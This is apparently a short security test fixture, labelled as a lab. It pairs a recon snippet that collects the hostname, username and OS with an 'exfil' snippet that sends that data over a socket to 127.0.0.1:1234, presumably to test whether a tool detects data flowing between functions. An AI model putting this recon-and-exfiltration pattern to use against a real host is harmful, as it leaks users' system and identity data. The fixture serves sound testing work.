_description: LAB: recon (gather_host) -> exfil (reads gather_host's output, sends to 127.0.0.1:1234). Inter-function data flow / injection; localhost-only; second security fixture.
gather_host:
import platform, getpass
result = {'host': platform.node(), 'user': getpass.getuser(), 'os': platform.platform()}
exfil_to_localhost:
import socket, json
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1234))
s.sendall(json.dumps(gather_host).encode())
s.close()
